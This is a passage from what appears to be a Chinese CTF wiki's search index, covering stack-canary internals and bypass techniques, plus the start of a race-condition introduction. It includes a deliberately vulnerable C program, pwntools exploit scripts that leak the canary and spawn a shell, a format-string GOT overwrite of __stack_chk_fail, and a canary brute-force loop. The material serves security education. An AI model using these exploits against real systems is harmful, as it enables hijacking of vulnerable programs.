# Bypass Canary payload = \" \\x90 \" * 100 + p32 ( Canary ) + \" \\x90 \" * 12 + p32 ( get_shell ) enter link description here io . send ( payload ) io . recv () #io.recv() io . interactive () 3.2\u52ab\u6301__stack_chk_fail\u793a\u4f8b \u00b6 \u5728 __stack__chk_fail \u51fd\u6570\u7684plt\u5730\u5740\u9644\u8fd1\u627e\u5230\u4e00\u6761ret\u6307\u4ee4\u3002 \u8ba9\u7a0b\u5e8f\u5373\u4f7f\u51fa\u9519\u4e5f\u4e0dabort\uff0c\u4ece\u800c\u5b9e\u73b0BOF\u5229\u7528\uff0creturn \u5230getshell\u4e2d\u5373\u53ef\u3002 \u6211\u4eec\u5df2\u77e5 __stack__chk_fail \u7684plt\u5730\u5740\u4e3a:0x8048450,\u5728\u6ca1\u6709lazy binding\u524d\u5b83\u4e2d\u5b58\u653e\u7684\u5e94\u8be5\u65f6plt\u7684\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u6211\u4eec\u5c31\u5728\u8fd9\u9644\u8fd1\u641c\u7d22\uff0c\u5bfb\u627eret\u6307\u4ee4\uff0c\u6216\u8005\u5176\u4ed6\u76f8\u5173\u6307\u4ee4 \u57280x0804840E\u627e\u5230\u4e00\u6761ret\u6307\u4ee4 \u6211\u4eec\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u66f4\u6539got\u8868\u4e3a\u8be5\u5730\u5740\u5373\u53ef #!/usr/bin/env python from pwn import * context . binary = 'ex2' #context.log_level = 'debug' io = process ( './ex2' ) elf = ELF ( './ex2' ) get_shell = 0x804859d stack_failed_addr = elf . got [ '__stack_chk_fail' ] log . info ( \"stack_failed_addr:\" + hex ( stack_failed_addr )) io . recvuntil ( \"Hello Hacker! \\n \" ) # hijack GOT['__stack_chk_fail'] to ret payload = p32 ( stack_failed_addr ) + ( 0xE - 0x4 ) * \"A\" + \"%6$hhn\" io . sendline ( payload ) io . recvline () payload = \" \\x90 \" * 116 + p32 ( get_shell ) io . send ( payload ) io . recv () io . recv () io . interactive ()","title":"Canary"},{"location":"pwn/mitigation/Canary/#canary","text":"","title":"Canary"},{"location":"pwn/mitigation/Canary/#0introduction","text":"\u7531\u4e8estack overflow\u800c\u5f15\u53d1\u7684\u653b\u51fb\u975e\u5e38\u666e\u904d\u4e5f\u975e\u5e38\u53e4\u8001, \u76f8\u5e94\u5730\u4e00\u79cd\u53eb\u505acanary\u7684 mitigation\u6280\u672f\u5f88\u65e9\u5c31\u51fa\u73b0\u5728gcc/glibc\u91cc, \u76f4\u5230\u73b0\u5728\u4e5f\u4f5c\u4e3a\u7cfb\u7edf\u5b89\u5168\u7684\u7b2c\u4e00\u9053\u9632\u7ebf\u5b58\u5728\u3002 canary\u4e0d\u7ba1\u662f\u5b9e\u73b0\u8fd8\u662f\u8bbe\u8ba1\u601d\u60f3\u90fd\u6bd4\u8f83\u7b80\u5355\u9ad8\u6548, \u5c31\u662f\u63d2\u5165\u4e00\u4e2a\u503c, \u5728stack overflow\u53d1\u751f\u7684 \u9ad8\u5371\u533a\u57df\u7684\u5c3e\u90e8, \u5f53\u51fd\u6570\u8fd4\u56de\u4e4b\u65f6\u68c0\u6d4bcanary\u7684\u503c\u662f\u5426\u7ecf\u8fc7\u4e86\u6539\u53d8, \u4ee5\u6b64\u6765\u5224\u65adstack/buffer overflow\u662f\u5426\u53d1\u751f. Canary\u4e0ewindows\u4e0b\u7684GS\u4fdd\u62a4\u90fd\u662f\u9632\u6b62\u6808\u6ea2\u51fa\u7684\u6709\u6548\u624b\u6bb5\uff0c\u5b83\u7684\u51fa\u73b0\u5f88\u5927\u7a0b\u5ea6\u4e0a\u9632\u6b62\u4e86\u6808\u6ea2\u51fa\u7684\u51fa\u73b0\uff0c\u5e76\u4e14\u7531\u4e8e\u5b83\u51e0\u4e4e\u5e76\u4e0d\u6d88\u8017\u7cfb\u7edf\u8d44\u6e90\uff0c\u6240\u4ee5\u73b0\u5728\u6210\u4e86linux\u4e0b\u4fdd\u62a4\u673a\u5236\u7684\u6807\u914d","title":"0.Introduction"},{"location":"pwn/mitigation/Canary/#1canary","text":"","title":"1.Canary \u539f\u7406"},{"location":"pwn/mitigation/Canary/#11gcccanary","text":"\u53ef\u4ee5\u5728GCC\u4e2d\u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570\u8bbe\u7f6eCanary: - fstack - protector \u542f\u7528\u4fdd\u62a4\uff0c\u4e0d\u8fc7\u53ea\u4e3a\u5c40\u90e8\u53d8\u91cf\u4e2d\u542b\u6709\u6570\u7ec4\u7684\u51fd\u6570\u63d2\u5165\u4fdd\u62a4 - fstack - protector - all \u542f\u7528\u4fdd\u62a4\uff0c\u4e3a\u6240\u6709\u51fd\u6570\u63d2\u5165\u4fdd\u62a4 - fstack - protector - strong - fstack - protector - explicit \u53ea\u5bf9\u6709\u660e\u786e stack_protect attribute\u7684\u51fd\u6570\u5f00\u542f\u4fdd\u62a4 - fno - stack - protector \u7981\u7528\u4fdd\u62a4 .","title":"1.1\u5728GCC\u4e2d\u4f7f\u7528Canary"},{"location":"pwn/mitigation/Canary/#12canary","text":"\u5f00\u542fCanary\u4fdd\u62a4\u7684stack\u7ed3\u6784\u5927\u6982\u5982\u4e0b High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp => | old ebp | +-----------------+ rbp-8 => | canary value | +-----------------+ | \u5c40\u90e8\u53d8\u91cf | Low | | Address \u5f53\u7a0b\u5e8f\u542f\u7528Canary\u7f16\u8bd1\u540e\uff0c\u5728\u51fd\u6570\u5e8f\u8a00\u90e8\u5206\u4f1a\u53d6fs\u5bc4\u5b58\u56680x28\u5904\u7684\u503c\uff0c\u5b58\u653e\u5728\u6808\u4e2d%ebp-0x8\u7684\u4f4d\u7f6e\u3002 \u8fd9\u4e2a\u64cd\u4f5c\u5373\u4e3a\u5411\u6808\u4e2d\u63d2\u5165Canary\u503c\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a mov rax, qword ptr fs:[0x28] mov qword ptr [rbp - 8], rax \u5728\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u4f1a\u5c06\u8be5\u503c\u53d6\u51fa\uff0c\u5e76\u4e0efs:0x28\u7684\u503c\u8fdb\u884c\u5f02\u6216\u3002\u5982\u679c\u6291\u6216\u7684\u7ed3\u679c\u4e3a0\uff0c\u8bf4\u660ecanary\u672a\u88ab\u4fee\u6539\uff0c\u51fd\u6570\u4f1a\u6b63\u5e38\u8fd4\u56de\uff0c\u8fd9\u4e2a\u64cd\u4f5c\u5373\u4e3a\u68c0\u6d4b\u662f\u5426\u53d1\u751f\u6808\u6ea2\u51fa\u3002 mov rdx,QWORD PTR [rbp-0x8] xor rdx,QWORD PTR fs:0x28 je 0x4005d7 <main+65> call 0x400460 <__stack_chk_fail@plt> \u5982\u679ccanary\u5df2\u7ecf\u88ab\u975e\u6cd5\u4fee\u6539\uff0c\u6b64\u65f6\u7a0b\u5e8f\u6d41\u7a0b\u4f1a\u8d70\u5230 stack_chk_fail\u3002 stack_chk_fail\u4e5f\u662f\u4f4d\u4e8eglibc\u4e2d\u7684\u51fd\u6570\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u7ecf\u8fc7ELF\u7684\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u5b9a\u4e49\u5982\u4e0b\u3002 eglibc-2.19/debug/stack_chk_fail.c void __attribute__ ((noreturn)) __stack_chk_fail (void) { __fortify_fail (\"stack smashing detected\"); } void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) { /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"<unknown>\"); } \u8fd9\u610f\u5473\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301 stack_chk_fail\u7684got\u503c\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5229\u7528 stack_chk_fail\u6cc4\u6f0f\u5185\u5bb9(\u53c2\u89c1stack smash)\u3002 \u8fdb\u4e00\u6b65\uff0c\u5bf9\u4e8eLinux\u6765\u8bf4\uff0cfs\u5bc4\u5b58\u5668\u5b9e\u9645\u6307\u5411\u7684\u662f\u5f53\u524d\u6808\u7684TLS\u7ed3\u6784\uff0cfs:0x28\u6307\u5411\u7684\u6b63\u662fstack_guard\u3002 typedef struct { void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; uintptr_t sysinfo; uintptr_t stack_guard; ... } tcbhead_t; \u5982\u679c\u5b58\u5728\u6ea2\u51fa\u53ef\u4ee5\u8986\u76d6\u4f4d\u4e8eTLS\u4e2d\u4fdd\u5b58\u7684Canary\u503c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7ed5\u8fc7\u4fdd\u62a4\u673a\u5236\u3002 \u4e8b\u5b9e\u4e0a\uff0cTLS\u4e2d\u7684\u503c\u7531\u51fd\u6570security_init\u8fdb\u884c\u521d\u59cb\u5316\u3002 static void security_init (void) { // _dl_random\u7684\u503c\u5728\u8fdb\u5165\u8fd9\u4e2a\u51fd\u6570\u7684\u65f6\u5019\u5c31\u5df2\u7ecf\u7531kernel\u5199\u5165. // glibc\u76f4\u63a5\u4f7f\u7528\u4e86_dl_random\u7684\u503c\u5e76\u6ca1\u6709\u7ed9\u8d4b\u503c // \u5982\u679c\u4e0d\u91c7\u7528\u8fd9\u79cd\u6a21\u5f0f, glibc\u4e5f\u53ef\u4ee5\u81ea\u5df1\u4ea7\u751f\u968f\u673a\u6570 //\u5c06_dl_random\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u8bbe\u7f6e\u4e3a0x0 uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random); // \u8bbe\u7f6eCanary\u7684\u503c\u5230TLS\u4e2d THREAD_SET_STACK_GUARD (stack_chk_guard); _dl_random = NULL; } //THREAD_SET_STACK_GUARD\u5b8f\u7528\u4e8e\u8bbe\u7f6eTLS #define THREAD_SET_STACK_GUARD(value) \\ THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)","title":"1.2Canary\u5b9e\u73b0\u539f\u7406"},{"location":"pwn/mitigation/Canary/#2canary","text":"","title":"2.Canary\u7ed5\u8fc7\u6280\u672f"},{"location":"pwn/mitigation/Canary/#21","text":"Canary\u662f\u4e00\u79cd\u5341\u5206\u6709\u6548\u7684\u89e3\u51b3\u6808\u6ea2\u51fa\u95ee\u9898\u7684\u6f0f\u6d1e\u7f13\u89e3\u63aa\u65bd\u3002\u4f46\u662f\u5e76\u4e0d\u610f\u5473\u7740Canary\u5c31\u80fd\u591f\u963b\u6b62\u6240\u6709\u7684\u6808\u6ea2\u51fa\u5229\u7528\uff0c\u5728\u8fd9\u91cc\u7ed9\u51fa\u4e86\u5e38\u89c1\u7684\u5b58\u5728Canary\u7684\u6808\u6ea2\u51fa\u5229\u7528\u601d\u8def\uff0c\u8bf7\u6ce8\u610f\u6bcf\u79cd\u65b9\u6cd5\u90fd\u6709\u7279\u5b9a\u7684\u73af\u5883\u8981\u6c42\u3002","title":"2.1 \u5e8f\u8a00"},{"location":"pwn/mitigation/Canary/#22-canary","text":"Canary\u8bbe\u8ba1\u4e3a\u4ee5\u5b57\u8282\"\\x00\"\u7ed3\u5c3e\uff0c\u672c\u610f\u662f\u4e3a\u4e86\u4fdd\u8bc1Canary\u53ef\u4ee5\u622a\u65ad\u5b57\u7b26\u4e32\u3002 \u6cc4\u9732\u6808\u4e2d\u7684Canary\u7684\u601d\u8def\u662f\u8986\u76d6Canary\u7684\u4f4e\u5b57\u8282\uff0c\u6765\u6253\u5370\u51fa\u5269\u4f59\u7684Canary\u90e8\u5206\u3002 \u8fd9\u79cd\u5229\u7528\u65b9\u5f0f\u9700\u8981\u5b58\u5728\u5408\u9002\u7684\u8f93\u51fa\u51fd\u6570\uff0c\u5e76\u4e14\u53ef\u80fd\u9700\u8981\u7b2c\u4e00\u6ea2\u51fa\u6cc4\u9732Canary\uff0c\u4e4b\u540e\u518d\u6b21\u6ea2\u51fa\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002","title":"2.2 \u6cc4\u9732\u6808\u4e2d\u7684Canary"},{"location":"pwn/mitigation/Canary/#23-one-by-onecanary","text":"\u5bf9\u4e8eCanary\uff0c\u4e0d\u4ec5\u6bcf\u6b21\u8fdb\u7a0b\u91cd\u542f\u540e\u7684Canary\u4e0d\u540c(\u76f8\u6bd4GS\uff0cGS\u91cd\u542f\u540e\u662f\u76f8\u540c\u7684)\uff0c\u800c\u4e14\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u7684\u6bcf\u4e2a\u7ebf\u7a0b\u7684Canary\u4e5f\u4e0d\u540c\u3002 \u4f46\u662f\u5b58\u5728\u4e00\u7c7b\u901a\u8fc7fork\u51fd\u6570\u5f00\u542f\u5b50\u8fdb\u7a0b\u4ea4\u4e92\u7684\u9898\u76ee\uff0c\u56e0\u4e3afork\u51fd\u6570\u4f1a\u76f4\u63a5\u62f7\u8d1d\u7236\u8fdb\u7a0b\u7684\u5185\u5b58\uff0c\u56e0\u6b64\u6bcf\u6b21\u521b\u5efa\u7684\u5b50\u8fdb\u7a0b\u7684Canary\u662f\u76f8\u540c\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u6837\u7684\u7279\u70b9\uff0c\u5f7b\u5e95\u9010\u4e2a\u5b57\u8282\u5c06Canary\u7206\u7834\u51fa\u6765\u3002 \u5728\u8457\u540d\u7684offset2libc\u7ed5\u8fc7linux64bit\u7684\u6240\u6709\u4fdd\u62a4\u7684\u6587\u7ae0\u4e2d\uff0c\u4f5c\u8005\u5c31\u662f\u5229\u7528\u8fd9\u6837\u7684\u65b9\u5f0f\u7206\u7834\u5f97\u5230\u7684Canary: \u8fd9\u662f\u7206\u7834\u7684Python\u4ee3\u7801: print \"[+] Brute forcing stack canary \" start = len ( p ) stop = len ( p ) + 8 while len ( p ) < stop : for i in xrange ( 0 , 256 ): res = send2server ( p + chr ( i )) if res != \"\" : p = p + chr ( i ) #print \"\\t[+] Byte found 0x%02x\" % i break if i == 255 : print \"[-] Exploit failed\" sys . exit ( - 1 ) canary = p [ stop : start - 1 : - 1 ] . encode ( \"hex\" ) print \" [+] SSP value is 0x %s \" % canary","title":"2.3 one-by-one\u7206\u7834Canary"},{"location":"pwn/mitigation/Canary/#24__stack_chk_fail","text":"\u5df2\u77e5Canary\u5931\u8d25\u7684\u5904\u7406\u903b\u8f91\u4f1a\u8fdb\u5165\u5230stack_chk_failed\u51fd\u6570\uff0cstack_chk_failed\u51fd\u6570\u662f\u4e00\u4e2a\u666e\u901a\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u51fd\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539GOT\u8868\u52ab\u6301\u8fd9\u4e2a\u51fd\u6570\u3002 \u53c2\u89c1ZCTF2017 Login\uff0c\u5229\u7528\u65b9\u5f0f\u662f\u901a\u8fc7fsb\u6f0f\u6d1e\u7be1\u6539__stack_chk_fail\u7684GOT\u8868\uff0c\u518d\u8fdb\u884cROP\u5229\u7528","title":"2.4\u52ab\u6301__stack_chk_fail\u51fd\u6570"},{"location":"pwn/mitigation/Canary/#25tlscanary","text":"\u5df2\u77e5Canary\u50a8\u5b58\u5728TLS\u4e2d\uff0c\u5728\u51fd\u6570\u8fd4\u56de\u524d\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u503c\u8fdb\u884c\u5bf9\u6bd4\u3002\u5f53\u6ea2\u51fa\u5c3a\u5bf8\u8f83\u5927\u65f6\uff0c\u53ef\u4ee5\u540c\u65f6\u8986\u76d6\u6808\u4e0a\u50a8\u5b58\u7684Canary\u548cTLS\u50a8\u5b58\u7684Canary\u5b9e\u73b0\u7ed5\u8fc7\u3002","title":"2.5\u8986\u76d6TLS\u4e2d\u50a8\u5b58\u7684Canary\u503c"},{"location":"pwn/mitigation/Canary/#3","text":"\u5b58\u5728\u6f0f\u6d1e\u7684\u793a\u4f8b\u6e90\u4ee3\u7801\u5982\u4e0b: // ex1.c #include <stdio.h> #include <unistd.h> #include <string.h> void getshell ( void ) { system ( \"/bin/sh\" ); } void init () { setbuf ( stdin , NULL ); setbuf ( stdout , NULL ); setbuf ( stderr , NULL ); } int main ( void ) { int i ; init (); char buf [ 100 ]; for ( i = 0 ; i < 2 ; i ++ ){ scanf ( \"%s\" , & buf ); printf ( buf ); } return 0 ; } \u7f16\u8bd1\u4e3a32bit\u7a0b\u5e8f\uff0c\u5f00\u542fNX\uff0cASLR\uff0cCanary\u4fdd\u62a4","title":"3.\u5229\u7528\u793a\u4f8b"},{"location":"pwn/mitigation/Canary/#31canary","text":"\u9996\u5148\u901a\u8fc7\u8986\u76d6Canary\u6700\u540e\u4e00\u4e2a\"\\x00\"\u5b57\u8282\u6765\u6253\u5370\u51fa4\u4f4d\u7684Canary \u4e4b\u540e\uff0c\u8ba1\u7b97\u597d\u504f\u79fb\uff0c\u5c06Canary\u586b\u5165\u5230\u76f8\u5e94\u7684\u6ea2\u51fa\u4f4d\u7f6e\uff0c\u5b9e\u73b0Ret\u5230getshell\u51fd\u6570\u4e2d #!/usr/bin/env python from pwn import * context . binary = ' ex2 ' #context.log_level = 'debug' io = process ( ' . / ex2 ' ) get_shell = 0x804859d io . recvuntil ( \"Hello Hacker! \\n \" ) # leak Canary payload = \"A\" * 100 io . sendline ( payload ) io . recvuntil ( \"A\" * 100 ) Canary = u32 ( io . recv ( 4 )) - 0xa log . info ( \"Canary:\" + hex ( Canary )) # Bypass Canary payload = \" \\x90 \" * 100 + p32 ( Canary ) + \" \\x90 \" * 12 + p32 ( get_shell ) enter link description here io . send ( payload ) io . recv () #io.recv() io . interactive ()","title":"3.1\u6cc4\u9732Canary\u793a\u4f8b"},{"location":"pwn/mitigation/Canary/#32__stack_chk_fail","text":"\u5728 __stack__chk_fail \u51fd\u6570\u7684plt\u5730\u5740\u9644\u8fd1\u627e\u5230\u4e00\u6761ret\u6307\u4ee4\u3002 \u8ba9\u7a0b\u5e8f\u5373\u4f7f\u51fa\u9519\u4e5f\u4e0dabort\uff0c\u4ece\u800c\u5b9e\u73b0BOF\u5229\u7528\uff0creturn \u5230getshell\u4e2d\u5373\u53ef\u3002 \u6211\u4eec\u5df2\u77e5 __stack__chk_fail \u7684plt\u5730\u5740\u4e3a:0x8048450,\u5728\u6ca1\u6709lazy binding\u524d\u5b83\u4e2d\u5b58\u653e\u7684\u5e94\u8be5\u65f6plt\u7684\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u6211\u4eec\u5c31\u5728\u8fd9\u9644\u8fd1\u641c\u7d22\uff0c\u5bfb\u627eret\u6307\u4ee4\uff0c\u6216\u8005\u5176\u4ed6\u76f8\u5173\u6307\u4ee4 \u57280x0804840E\u627e\u5230\u4e00\u6761ret\u6307\u4ee4 \u6211\u4eec\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u66f4\u6539got\u8868\u4e3a\u8be5\u5730\u5740\u5373\u53ef #!/usr/bin/env python from pwn import * context . binary = 'ex2' #context.log_level = 'debug' io = process ( './ex2' ) elf = ELF ( './ex2' ) get_shell = 0x804859d stack_failed_addr = elf . got [ '__stack_chk_fail' ] log . info ( \"stack_failed_addr:\" + hex ( stack_failed_addr )) io . recvuntil ( \"Hello Hacker! \\n \" ) # hijack GOT['__stack_chk_fail'] to ret payload = p32 ( stack_failed_addr ) + ( 0xE - 0x4 ) * \"A\" + \"%6$hhn\" io . sendline ( payload ) io . recvline () payload = \" \\x90 \" * 116 + p32 ( get_shell ) io . send ( payload ) io . recv () io . recv () io . interactive ()","title":"3.2\u52ab\u6301__stack_chk_fail\u793a\u4f8b"},{"location":"pwn/race-condition/introduction/","text":"Race Condition \u00b6 \u6982\u8ff0 \u00b6 \u6761\u4ef6\u7ade\u4e89\u662f\u6307\u4e00\u4e2a\u7cfb\u7edf\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u7684\u5148\u540e\u987a\u5e8f\u3002\u5f53\u8fd9\u4e9b\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u5e76\u6ca1\u6709\u6309\u7167\u5f00\u53d1\u8005\u60f3\u8981\u7684\u65b9\u5f0f\u8fd0\u884c\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0 bug\u3002\u8fd9\u4e2a\u672f\u8bed\u6700\u521d\u6765\u81ea\u4e8e\u4e24\u4e2a\u7535\u4fe1\u53f7\u4e92\u76f8\u7ade\u4e89\u6765\u5f71\u54cd\u8f93\u51fa\u7ed3\u679c\u3002 \u6761\u4ef6\u7ade\u4e89\u4e3b\u8981\u51fa\u73b0\u5728\u5982\u4e0b\u9886\u57df \u7535\u5b50\u7cfb\u7edf\uff0c\u5c24\u5176\u662f\u903b\u8f91\u7535\u8def \u8ba1\u7b97\u673a\uff0c\u5c24\u5176\u662f\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u548c\u5206\u5e03\u5f0f\u7a0b\u5e8f\u3002 \u7531\u4e8e\u76ee\u524d\u7684\u7cfb\u7edf\u4e2d\u5927\u91cf\u91c7\u7528\u5e76\u53d1\u7f16\u7a0b\uff0c\u7ecf\u5e38\u5bf9\u8d44\u6e90\u8fdb\u884c\u5171\u4eab\uff0c\u5f80\u5f80\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u3002 \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8003\u8651\u8ba1\u7b97\u673a\u7a0b\u5e8f\u65b9\u9762\u7684\u6761\u4ef6\u7ade\u4e89\u3002\u5f53\u4e00\u4e2a\u8f6f\u4ef6\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u7684\u987a\u5e8f\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6761\u4ef6\u7ade\u4e89\u3002\u7b80\u5355\u8003\u8651\u4e00\u4e0b\uff0c\u53ef\u4ee5\u77e5\u9053\u6761\u4ef6\u7ade\u4e89\u9700\u8981\u5982\u4e0b\u7684 \u6761\u4ef6 \uff1a \u5e76\u53d1\uff0c\u5373\u81f3\u5c11\u5b58\u5728\u4e24\u4e2a\u5e76\u53d1\u6267\u884c\u6d41\u3002\u8fd9\u91cc\u7684\u6267\u884c\u6d41\u5305\u62ec\u7ebf\u7a0b\uff0c\u8fdb\u7a0b\uff0c\u4efb\u52a1\u7b49\u7ea7\u522b\u7684\u6267\u884c\u6d41\u3002 \u5171\u4eab\u5bf9\u8c61\uff0c\u5373\u591a\u4e2a\u5e76\u53d1\u6d41\u4f1a\u8bbf\u95ee\u540c\u4e00\u5bf9\u8c61\u3002 \u5e38\u89c1\u7684\u5171\u4eab\u5bf9\u8c61\u6709\u5171\u4eab\u5185\u5b58\uff0c\u6587\u4ef6\u7cfb\u7edf\uff0c\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e9b\u5171\u4eab\u5bf9\u8c61\u662f\u7528\u6765\u4f7f\u5f97\u591a\u4e2a\u7a0b\u5e8f\u6267\u884c\u6d41\u76f8\u4e92\u4ea4\u6d41\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u79f0\u8bbf\u95ee\u5171\u4eab\u5bf9\u8c61\u7684\u4ee3\u7801\u4e3a \u4e34\u754c\u533a \u3002\u5728\u6b63\u5e38\u5199\u4ee3\u7801\u65f6\uff0c\u8fd9\u90e8\u5206\u5e94\u8be5\u52a0\u9501\u3002 \u6539\u53d8\u5bf9\u8c61\uff0c\u5373\u81f3\u5c11\u6709\u4e00\u4e2a\u63a7\u5236\u6d41\u4f1a\u6539\u53d8\u7ade\u4e89\u5bf9\u8c61\u7684\u72b6\u6001\u3002\u56e0\u4e3a\u5982\u679c\u7a0b\u5e8f\u53ea\u662f\u5bf9\u5bf9\u8c61\u8fdb\u884c\u8bfb\u64cd\u4f5c\uff0c\u90a3\u4e48\u5e76\u4e0d\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u3002 \u7531\u4e8e\u5728\u5e76\u53d1\u65f6\uff0c\u6267\u884c\u6d41\u7684\u4e0d\u786e\u5b9a\u6027\u5f88\u5927\uff0c\u6761\u4ef6\u7ade\u4e89\u76f8\u5bf9 \u96be\u5bdf\u89c9 \uff0c\u5e76\u4e14\u5728 \u590d\u73b0\u548c\u8c03\u8bd5\u65b9\u9762\u4f1a\u6bd4\u8f83\u56f0\u96be \u3002\u8fd9\u7ed9\u4fee\u590d\u6761\u4ef6\u7ade\u4e89\u4e5f\u5e26\u6765\u4e86\u4e0d\u5c0f\u7684\u56f0\u96be\u3002 \u6761\u4ef6\u7ade\u4e89\u9020\u6210\u7684\u5f71\u54cd\u4e5f\u662f\u591a\u6837\u7684\uff0c\u8f7b\u5219\u7a0b\u5e8f\u5f02\u5e38\u6267\u884c\uff0c\u91cd\u5219\u7a0b\u5e8f\u5d29\u6e83\u3002\u5982\u679c\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u88ab\u653b\u51fb\u8005\u5229\u7528\u7684\u8bdd\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u4f7f\u5f97\u653b\u51fb\u8005\u83b7\u5f97\u76f8\u5e94\u7cfb\u7edf\u7684\u7279\u6743\u3002 \u8fd9\u91cc\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002 #include <pthread.h> #include <stdio.h> int counter ; void * IncreaseCounter ( void * args ) { counter += 1 ; sleep ( 0.1 ); printf ( \"Thread %d has counter value %d \\n \" , ( unsigned int ) pthread_self (), counter ); } int main () { pthread_t p [ 10 ]; for ( int i = 0 ; i < 10 ; ++ i ) { pthread_create ( & p [ i ], NULL , IncreaseCounter , NULL ); } for ( int i = 0 ; i < 10 ; ++ i ) { pthread_join ( p [ i ], NULL ); } return 0 ; } \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u6309\u5982\u4e0b\u65b9\u5f0f\u8f93\u51fa \u279c 005race_condition ./example1 Thread 1859024640 has counter value 1 Thread 1841583872 has counter value 2 Thread 1832863488 has counter value 3 Thread 1824143104 has counter value 4 Thread 1744828160 has counter value 5 Thread 1736107776 has counter value 6 Thread 1727387392 has counter value 7 Thread 1850304256 has counter value 8 Thread 1709946624 has counter value 9 Thread 1718667008 has counter value 10 \u4f46\u662f\uff0c\u7531\u4e8e\u6761\u4ef6\u7ade\u4e89\u7684\u5b58\u5728\uff0c\u6700\u540e\u8f93\u51fa\u7684\u7ed3\u679c\u5f80\u5f80\u4e0d\u5c3d\u4eba\u610f \u279c 005 race_condition . / example1 Thread 1417475840 has counter value 2 Thread 1408755456 has counter value 2 Thread 1391314688 has counter value 8 Thread 1356433152 has counter value 8 Thread 1365153536 has counter value 8 Thread 1373873920 has counter value 8 Thread 1382594304 has counter value 8 Thread 1400035072 has counter value 8 Thread 1275066112 has counter value 9 Thread 1266345728 has counter value 10 \u4ed4\u7ec6\u601d\u8003\u4e00\u4e0b\u6761\u4ef6\u7ade\u4e89\u4e3a\u4ec0\u4e48\u53ef\u80fd\u4f1a\u53d1\u751f\u5462\uff1f\u4ee5\u4e0b\u9762\u7684\u4e3a\u5177\u4f53\u7684\u4f8b\u5b50 \u7a0b\u5e8f\u9996\u5148\u6267\u884c\u4e86action1\uff0c\u7136\u540e\u6267\u884c\u4e86action2\u3002\u5176\u4e2d action \u53ef\u80fd\u662f\u5e94\u7528\u7ea7\u522b\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u522b\u7684\u3002\u6b63\u5e38\u6765\u8bf4\uff0c\u6211\u4eec\u5e0c\u671b\u7a0b\u5e8f\u5728\u6267\u884c action2 \u65f6\uff0caction1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u4ecd\u7136\u662f\u6ee1\u8db3\u7684\u3002 \u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u7684\u5e76\u53d1\u6027\uff0c\u653b\u51fb\u8005\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u5728 action2 \u6267\u884c\u4e4b\u524d\u7684\u8fd9\u4e2a\u77ed\u6682\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u7834\u574f action1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u3002\u8fd9\u65f6\u5019\u653b\u51fb\u8005\u7684\u64cd\u4f5c\u4e0e action2 \u4ea7\u751f\u4e86\u6761\u4ef6\u7ade\u4e89\uff0c\u6240\u4ee5\u53ef\u80fd\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u6267\u884c\u6548\u679c\u3002 \u6240\u4ee5\u6211\u8ba4\u4e3a\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u7a0b\u5e8f\u5458\u867d\u7136\u5047\u8bbe\u67d0\u4e2a\u6761\u4ef6\u5728\u76f8\u5e94\u65f6\u95f4\u6bb5\u5e94\u8be5\u662f\u6ee1\u8db3\u7684\uff0c\u4f46\u662f\u5f80\u5f80\u6761\u4ef6\u53ef\u80fd\u4f1a\u5728\u8fd9\u4e2a\u5f88\u5c0f\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u88ab\u4fee\u6539\u3002 